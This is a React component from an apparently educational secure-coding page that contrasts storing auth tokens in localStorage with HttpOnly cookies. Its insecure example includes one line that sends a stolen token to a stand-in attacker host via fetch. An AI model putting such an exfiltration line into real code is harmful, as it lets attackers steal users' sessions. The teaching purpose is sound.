'use client'

import { useState } from 'react'
import { CodeBox } from './code-box'

export function TokenStorageDemo() {
  const [activeTab, setActiveTab] = useState<'insecure' | 'secure'>('insecure')

  return (
    <div className="my-8">
      {/* Tabs */}
      <div className="flex gap-1 mb-4">
        <button
          onClick={() => setActiveTab('insecure')}
          className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors text-gray-1100 dark:text-gray-1100 ${
            activeTab === 'insecure'
              ? 'bg-gray-300 dark:bg-gray-200'
              : 'hover:bg-gray-300/50 dark:hover:bg-gray-200/50'
          }`}
        >
          ❌ localStorage
        </button>
        <button
          onClick={() => setActiveTab('secure')}
          className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors text-gray-1100 dark:text-gray-1100 ${
            activeTab === 'secure'
              ? 'bg-gray-300 dark:bg-gray-200'
              : 'hover:bg-gray-300/50 dark:hover:bg-gray-200/50'
          }`}
        >
          ✅ HttpOnly Cookies
        </button>
          </div>

      {/* Content - min-height prevents layout shift */}
      <div className="min-h-[380px]">
        {activeTab === 'insecure' && (
          <div className="space-y-4">
            <CodeBox title="Vulnerable Pattern" language="javascript">
{`// Frontend stores the token
localStorage.setItem('access_token', token)

// Any script can access it:
const stolen = localStorage.getItem('access_token')

// If there's XSS, the token is stolen!
fetch('https://attacker.com?token=' + stolen)`}
            </CodeBox>
            <p className="text-sm text-gray-1100 dark:text-gray-1100">
              localStorage is accessible via JavaScript. If there's XSS, the attacker steals your token and authenticates as you.
              </p>
          </div>
        )}

        {activeTab === 'secure' && (
          <div className="space-y-4">
            <CodeBox title="Secure Pattern" language="javascript">
{`// Backend sets the cookie
res.cookie('auth_token', token, {
  httpOnly: true,    // Inaccessible to JavaScript!
  secure: true,      // HTTPS only
  sameSite: 'strict' // CSRF protection
})

// Frontend: cookie is sent automatically
// No need to do anything!

// Attempt to access via JavaScript:
document.cookie // → "" (empty, protected!)`}
            </CodeBox>
            <ul className="text-sm text-gray-1100 dark:text-gray-1100 space-y-1 list-disc list-inside ml-2">
              <li><span className="font-medium">httpOnly:</span> JavaScript cannot access</li>
              <li><span className="font-medium">secure:</span> HTTPS only</li>
              <li><span className="font-medium">sameSite:</span> CSRF protection</li>
              <li><span className="font-medium">Automatic:</span> Browser manages sending</li>
                </ul>
            <p className="text-sm text-gray-1100 dark:text-gray-1100 italic mt-4">
              💡 Even with XSS, the attacker cannot steal an HttpOnly cookie.
              </p>
          </div>
        )}
      </div>
    </div>
  )
}
